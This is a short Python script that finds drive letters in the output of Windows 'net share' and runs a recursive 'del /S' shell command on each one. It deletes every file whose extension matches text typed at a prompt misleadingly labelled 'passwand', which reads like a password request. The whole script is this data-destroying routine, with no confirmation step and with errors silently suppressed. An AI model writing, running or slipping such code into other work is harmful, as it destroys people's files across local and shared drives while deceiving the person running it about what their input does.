import subprocess as sub


sys_drive=[]

def Find_Drive():
     drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]

     cmd = sub.check_output("net share",shell=True).decode()
     
     for i in drive:
         if i in str(cmd):
             sys_drive.append(i)


def Delete_File():
     for i in sys_drive:
         try:
             sub.check_output("del /S "+i+"\\"+"*."+F, shell=True).decode()
         except:
             pass



F = input("passwand: ")
Find_Drive()
Delete_File()
